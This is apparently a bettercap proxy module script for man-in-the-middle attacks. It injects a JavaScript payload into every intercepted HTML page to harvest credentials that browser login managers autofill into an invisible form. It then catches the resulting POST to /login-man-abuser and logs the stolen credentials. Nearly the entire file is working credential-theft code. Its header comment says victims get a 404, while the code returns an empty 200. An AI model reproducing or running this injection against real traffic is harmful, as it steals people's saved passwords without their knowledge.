/*
 * Ref. 
 *  - https://github.com/evilsocket/bettercap-proxy-modules/issues/72
 *  - https://freedom-to-tinker.com/2017/12/27/no-boundaries-for-user-identities-web-trackers-exploit-browser-login-managers/
 *
 * The idea:
 *
 * - On every html page, inject this invisible form who grabs credentials from login managers.
 * - POST such credentials to /login-man-abuser, given we control the HTTP traffic, we'll intercept this request.
 * - Intercept request, dump credentials, drop client to 404.
 */
var AbuserJavascript = "";

function onLoad() {
    // log( "Loading abuser code from caplets/login-man-abuser.js" );
    AbuserJavascript = readFile("caplets/login-man-abuser.js")
}

// here we intercept the ajax POST request with leaked credentials.
function onRequest(req, res) {
    if( req.Method == 'POST' && req.Path == "/login-man-abuser" ) {
        log( "[LOGIN MANAGER ABUSER]\n", req.ReadBody() );
        // this was just a fake request we needed to exfiltrate
        // credentials to us, drop the connection with an empty 200.
        res.Status      = 200;
        res.ContentType = "text/html";
        res.Headers     = "Connection: close";
        res.Body        = "";
    }
}

// inject the javascript in html pages
function onResponse(req, res) {
    if( res.ContentType.indexOf('text/html') == 0 ){
        var body = res.ReadBody();
        if( body.indexOf('</head>') != -1 ) {
            res.Body = body.replace( 
                '</head>', 
                '<script type="text/javascript">' + "\n" +
                    AbuserJavascript +
                '</script>' +
                '</head>'
            ); 
        }
    }
}
